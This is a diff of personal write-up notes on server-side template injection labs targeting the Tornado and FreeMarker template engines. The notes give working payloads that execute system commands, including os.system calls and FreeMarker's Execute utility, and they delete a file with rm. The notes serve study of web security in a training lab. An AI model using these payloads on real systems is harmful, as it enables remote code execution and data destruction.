@@ -116,8 +116,15 @@ Jinja2 - Python/Flask Template engine
 
      1.Send request POST /my-account/change-blog-post-author-display HTTP/2 to repeater
      2.Entered the payload {% import os %}{{os.system('whoami')}} in comment section and it reflected that system is using tornado template .
-     2.Final payload:- blog-post-author-display=user.name }}{% import os %}{{os.system('rm /home/carlos/morale.txt' )}}
+     3.Final payload:- blog-post-author-display=user.name }}{% import os %}{{os.system('rm /home/carlos/morale.txt' )}}
 
+-----------------------------------------------------------------------------------------------------------------------------
 
+#3 Lab:Server-side template injection using documentation
+
+      1.Go to any product and edit template and enter anything.
+      2.Now you got to know that it's based on Freemaker template engine.
+      3. payload:- <#assign command="freemarker.template.utility.Execute"?new()> ${ command("rm /home/carlos/morale.txt
+") }
 
 PREVENTION OF SSTI:- The best way to prevent server-side template injection is to not allow any users to modify or submit new templates
